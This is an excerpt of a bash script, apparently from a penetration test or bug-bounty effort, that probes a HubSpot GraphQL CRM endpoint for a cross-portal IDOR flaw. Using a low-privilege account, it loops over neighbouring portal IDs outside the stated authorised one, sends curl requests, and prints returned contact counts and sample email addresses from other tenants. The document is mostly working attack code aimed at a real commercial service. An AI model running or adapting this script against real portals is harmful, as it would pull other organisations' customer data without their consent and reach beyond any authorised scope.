...
# ATTACK VECTOR 4: Cross-Portal IDOR (CRITICAL)
# Test if LOW-PRIV account can access different portal IDs

echo "=========================================="
echo "TEST 3: CROSS-PORTAL IDOR"
echo "=========================================="
echo ""
echo "TARGET: Access different portal IDs with LOW-PRIV account"
echo "AUTHORIZED PORTAL: 242862774"
echo "TEST PORTALS: 242862775, 242862776, 242862773"
echo ""
...
for PORTAL_ID in 242862775 242862776 242862773 242862780; do
    echo "=========================================="
    echo "Testing Portal ID: ${PORTAL_ID}"
    echo "Expected: 403 Forbidden or authorization error"
    echo ""

    RESPONSE=$(curl -k -s -w "\nHTTP_STATUS:%{http_code}" \
      "https://app-na2.hubspot.com/api/graphql/crm?portalId=${PORTAL_ID}&clienttimeout=14000&hs_static_app=object-builder-ui&hs_static_app_version=1.51882" \
      -X POST \
    ...
    # Check for data
    if echo "$BODY" | jq -e '.data.crmObjectsSearch.results' > /dev/null 2>&1; then
        RESULT_COUNT=$(echo "$BODY" | jq -r '.data.crmObjectsSearch.results | length')
        TOTAL=$(echo "$BODY" | jq -r '.data.crmObjectsSearch.total')

        if [ "$RESULT_COUNT" -gt "0" ]; then
            echo "CRITICAL VULNERABILITY: Cross-portal IDOR confirmed!"
            echo "Returned ${RESULT_COUNT} contacts from portal ${PORTAL_ID}"
            echo "Total contacts available: ${TOTAL}"
            echo ""
            echo "Sample data:"
            echo "$BODY" | jq -r '.data.crmObjectsSearch.results[0].properties[] | select(.name=="email") | .value' 2>/dev/null
        else
            echo "No contacts returned (portal may be empty)"
        fi
    else
        echo "Response:"
...
echo "=========================================="
echo "Cross-Portal IDOR Testing Complete"
echo "=========================================="
